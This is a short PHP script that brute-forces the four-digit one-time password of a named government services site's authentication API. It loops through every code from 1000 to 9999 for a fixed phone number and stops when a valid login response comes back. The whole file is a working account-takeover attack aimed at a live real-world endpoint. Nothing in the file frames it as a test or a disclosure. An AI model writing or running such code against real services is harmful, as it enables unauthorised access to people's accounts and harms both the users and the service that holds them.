<?php
//$data = json_decode(file_get_contents('./dtt.json'), true);

//echo count($data['data']['onstreet']);

include './includes/core.php';
echo date("d-M-Y h:i:s").'<br/>';
for ($i = 1000; $i <= 9999; $i++) {
    $url =  'https://nairobiservices.go.ke/api/authentication/auth/OTP/validate';
    $data = ['otp' => $i, 'phone_number' => '00000000010'];
    $dt1 = httpPost($url, $data);
    $dt2 = json_decode($dt1, true);
    
    if($dt2['status'] == 200){
      echo $dt1.'<br/> OTP:'.$i.'<br/>';
      echo date("d-M-Y h:i:s").'<br/>';
      break;
      die;
    }
}
echo date("d-M-Y h:i:s").'<br/>';
//echo 'TOTAL: '.$all;
//echo authCookie();